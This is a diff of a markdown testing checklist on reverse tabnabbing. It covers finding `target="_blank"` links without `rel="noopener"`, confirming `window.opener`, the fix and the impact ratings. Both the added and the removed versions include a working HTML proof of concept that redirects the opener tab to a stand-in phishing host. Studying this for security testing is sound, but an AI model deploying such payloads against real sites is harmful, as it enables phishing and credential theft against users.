@@ -1,27 +1,60 @@
-# Tabnabbing
+# Tabnabbing / Reverse Tabnabbing
 
-## Introduction
-When you open a link in a new tab ( target="_blank" ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property.
+## Find Vulnerable Links
 
-## How to find
+- [ ] Search page source for `target="_blank"` without `rel="noopener noreferrer"`:
+  ```bash
+  # In Burp — search response body
+  # CLI on downloaded HTML
+  grep -n 'target="_blank"' page.html | grep -v 'noopener'
+  ```
+- [ ] Check user-submitted content areas that render links (profiles, comments, bio fields)
+- [ ] Check the application's own outbound links in navigation/footers
+
+## Confirm window.opener is Not Null
+
+- [ ] Open the linked page in a new tab — in the browser console run:
+  ```javascript
+  console.log(window.opener);
+  // null = patched, object = vulnerable
+  ```
+
+## PoC — Exploit Reverse Tabnabbing
+
+- [ ] Host this on attacker-controlled domain:
+  ```html
+  <html>
+  <script>
+  if (window.opener) {
+    window.opener.location = 'https://attacker.com/phish';
+  }
+  </script>
+  <body>Legitimate-looking content here</body>
+  </html>
+  ```
+- [ ] Get the target app to link to your page with `target="_blank"` (e.g. submit link in profile)
+- [ ] Click the link, observe background tab redirected to attacker domain
+
+## Quick Check — Fix Expected
+
 ```html
-<a href="..." target="_blank" rel="" />  
+<!-- Vulnerable -->
+<a href="https://external.com" target="_blank">Link</a>
 
-<a href="..." target="_blank" />
+<!-- Fixed -->
+<a href="https://external.com" target="_blank" rel="noopener noreferrer">Link</a>
 ```
 
-## How to Exploit
-1. Attacker posts a link to a website under his control that contains the following JS code:
-    ```html
-    <html>
-    <script>
-    if (window.opener) window.opener.parent.location.replace('http://evil.com');
-    if (window.parent != window) window.parent.location.replace('http://evil.com');
-    </script>
-    </html>
-    ```
-2. He tricks the victim into visiting the link, which is opened in the browser in a new tab.
-3. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website.
+- [ ] Confirm if `rel="noopener noreferrer"` is absent on ALL external `_blank` links
+- [ ] Check for dynamically injected links via JS (`document.createElement('a')`) — those also need `rel`
+
+## Impact
+
+- Reverse tabnabbing alone = Low/Informational on most programs
+- Escalate: tabnabbing + login page redirect + credential theft = Medium/High
+- Escalate: occurs in a high-trust context (banking, HR portal) = Medium
 
 ## References
-* [Hackerone #260278](https://hackerone.com/reports/260278)
+
+- [HackerOne #260278](https://hackerone.com/reports/260278)
+- [OWASP Reverse Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)
